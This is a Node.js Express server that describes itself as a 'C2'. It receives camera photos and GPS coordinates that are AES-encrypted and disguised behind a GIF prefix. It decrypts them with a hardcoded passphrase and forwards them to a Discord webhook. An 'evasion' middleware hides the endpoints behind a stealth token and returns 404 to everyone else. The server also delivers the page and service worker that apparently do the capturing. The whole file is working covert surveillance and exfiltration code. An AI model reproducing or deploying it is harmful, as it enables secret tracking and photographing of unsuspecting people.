const express = require('express');
const crypto = require('crypto');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK; 
const SECRET_PASSPHRASE = "neural-link-omega-99"; 
const STEALTH_TOKEN = "delta-v-882-alpha";
const GIF_MASK = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";

app.use(express.json({ limit: '50mb' }));

// Evasion Middleware
app.use((req, res, next) => {
    if (req.path === '/save-photo' || req.path === '/heartbeat') {
        if (req.header('X-Neural-Token') !== STEALTH_TOKEN) {
            return res.status(404).send('Not Found');
        }
    }
    next();
});

function decryptPackage(maskedData) {
    try {
        const jsonString = Buffer.from(maskedData.replace(GIF_MASK, ""), 'base64').toString();
        const { iv, content } = JSON.parse(jsonString);
        const salt = Buffer.from("neural-static-salt");
        const key = crypto.pbkdf2Sync(SECRET_PASSPHRASE, salt, 100000, 32, 'sha256');
        const ivBuffer = Buffer.from(iv, 'base64');
        const encryptedBuffer = Buffer.from(content, 'base64');
        const tag = encryptedBuffer.slice(encryptedBuffer.length - 16);
        const ciphertext = encryptedBuffer.slice(0, encryptedBuffer.length - 16);
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, ivBuffer);
        decipher.setAuthTag(tag);
        return JSON.parse(decipher.update(ciphertext, 'binary', 'utf8') + decipher.final('utf8'));
    } catch (err) { return null; }
}

app.head('/heartbeat', (req, res) => res.sendStatus(200));

app.post('/save-photo', async (req, res) => {
    const intel = decryptPackage(req.body.data);
    if (!intel) return res.status(404).send();

    if (DISCORD_WEBHOOK) {
        try {
            const buffer = Buffer.from(intel.image.split(',')[1], 'base64');
            const form = new FormData();
            form.append('file', buffer, { filename: 'intel.jpg' });
            form.append('payload_json', JSON.stringify({
                embeds: [{
                    title: "🛰️ NEURALSCAN INTEL",
                    color: 0x6366f1,
                    fields: [
                        { name: "📍 GPS", value: `[${intel.metadata.location.lat}, ${intel.metadata.location.lon}](https://www.google.com/maps?q=${intel.metadata.location.lat},${intel.metadata.location.lon})`, inline: true },
                        { name: "🕒 Time", value: intel.metadata.ts, inline: true }
                    ],
                    image: { url: "attachment://intel.jpg" }
                }]
            }));
            await axios.post(DISCORD_WEBHOOK, form, { headers: form.getHeaders() });
        } catch (e) {}
    }
    res.sendStatus(200);
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/sw.js', (req, res) => res.sendFile(path.join(__dirname, 'sw.js')));

app.listen(PORT, '0.0.0.0', () => console.log(`🚀 C2 Active on ${PORT}`));
